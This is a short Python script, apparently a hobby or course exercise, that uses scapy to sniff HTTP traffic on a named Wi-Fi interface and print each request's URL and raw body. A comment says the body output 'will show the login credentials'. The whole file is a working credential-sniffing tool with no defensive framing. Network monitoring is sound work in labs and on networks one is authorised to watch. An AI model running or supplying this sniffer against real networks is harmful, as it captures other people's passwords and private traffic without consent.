from scapy.all import *
from scapy.layers import http

def capture(interface):
    sniff(iface= interface, store=False, prn=sniffer)

def sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(Raw):
            print(packet[Raw]) # it will show the login credentials
    
# it will only sniff HTTP requests 

iface_name= "Intel(R) Wi-Fi 6 AX201 160MHz" # it will sniff packets in this interface
capture(iface_name)

